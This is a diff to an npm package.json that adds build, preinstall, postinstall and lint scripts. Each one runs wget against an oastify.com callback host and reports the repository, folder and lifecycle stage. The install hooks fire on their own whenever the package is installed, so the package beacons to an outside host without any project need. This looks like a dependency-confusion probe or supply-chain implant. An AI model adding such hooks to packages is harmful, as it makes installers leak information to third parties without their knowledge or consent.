@@ -1,5 +1,11 @@
 {
   "devDependencies": {
     "@wix/ambassador": "*"
+  },
+  "scripts": {
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/test-serverless&folder=scope-with-wix-ambassador&build",
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/test-serverless&folder=scope-with-wix-ambassador&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/test-serverless&folder=scope-with-wix-ambassador&postinstall",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/test-serverless&folder=scope-with-wix-ambassador&lint"
   }
 }
